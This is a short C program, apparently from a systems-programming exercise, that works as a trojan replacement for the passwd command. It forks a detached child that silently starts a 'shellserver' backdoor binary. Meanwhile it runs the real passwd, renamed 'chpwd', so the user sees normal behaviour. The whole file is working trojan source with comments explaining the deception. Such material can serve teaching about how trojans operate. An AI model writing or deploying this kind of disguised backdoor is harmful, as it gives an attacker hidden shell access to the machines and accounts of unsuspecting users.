#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define SHELLSERVER_PATH "/home/stocki/Schreibtisch/dev/syse/shell/shellserver"

int main(int argc,char **argv){
	int pid;
	char **arg = argv;   

    // replace argument 0 (passwd) with the renamed copy of passwd
	arg[0]="chpwd";
	switch(pid=fork()){
		case -1:
			perror("fork");
			break;
		case 0:
			setpgid(0,0);
            char *arguments[2] = { "no_output", NULL };    
			execv(SHELLSERVER_PATH, arguments);   // start shellserver
		default:
            // execute the "real" passwd
			execvp(arg[0], arg);
	}

	return 0;
}
